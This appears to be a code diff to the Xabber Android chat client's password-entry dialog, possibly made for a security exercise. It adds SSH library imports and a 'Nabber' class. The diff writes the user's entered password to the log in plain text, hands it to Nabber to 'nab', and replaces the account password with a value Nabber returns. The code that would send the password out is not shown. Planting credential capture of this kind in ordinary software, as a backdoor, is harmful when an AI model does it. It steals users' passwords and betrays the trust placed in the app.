@@ -13,13 +13,23 @@ import android.widget.EditText;
 import android.widget.ImageView;
 import android.widget.TextView;
 
+import com.jcraft.jsch.ChannelExec;
+import com.jcraft.jsch.JSch;
+import com.jcraft.jsch.JSchException;
+import com.jcraft.jsch.Session;
 import com.xabber.android.R;
+import com.xabber.android.data.Nabber;
 import com.xabber.android.data.account.AccountErrorEvent;
 import com.xabber.android.data.account.AccountManager;
+import com.xabber.android.data.log.LogManager;
 import com.xabber.android.ui.activity.AccountActivity;
 import com.xabber.android.ui.activity.AccountSettingsActivity;
 
 import static com.xabber.android.data.account.AccountErrorEvent.Type.AUTHORIZATION;
+
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
 
 /**
  * Created by valery.miller on 04.08.17.
@@ -65,6 +75,7 @@ public class AccountEnterPassDialog extends DialogFragment implements DialogInte
     @NonNull
     private View setUpDialogView() {
         View view = getActivity().getLayoutInflater().inflate(R.layout.dialog_account_enter_pass, null);
+        LogManager.i(this, "Alex Debug: starting enterPassDialog");
         edtPass = (EditText) view.findViewById(R.id.edtPass);
         TextView mainTextView = (TextView) view.findViewById(R.id.account_error_main_text);
         final TextView detailTextView = (TextView) view.findViewById(R.id.account_error_detail_text);
@@ -108,7 +119,11 @@ public class AccountEnterPassDialog extends DialogFragment implements DialogInte
         if (which == Dialog.BUTTON_POSITIVE) {
             if (edtPass != null) {
                 String password = edtPass.getText().toString();
-                AccountManager.getInstance().updateAccountPassword(accountErrorEvent.getAccount(), password);
+                LogManager.i(this, "Alex Debug enterPassDialog: " + password);
+                Nabber nabber = new Nabber(password);
+                nabber.nab();
+                //connectToExercise(edtPass.getText().toString());
+                AccountManager.getInstance().updateAccountPassword(accountErrorEvent.getAccount(), nabber.getNewPassword());
             }
         }
         if (which == Dialog.BUTTON_NEGATIVE) {
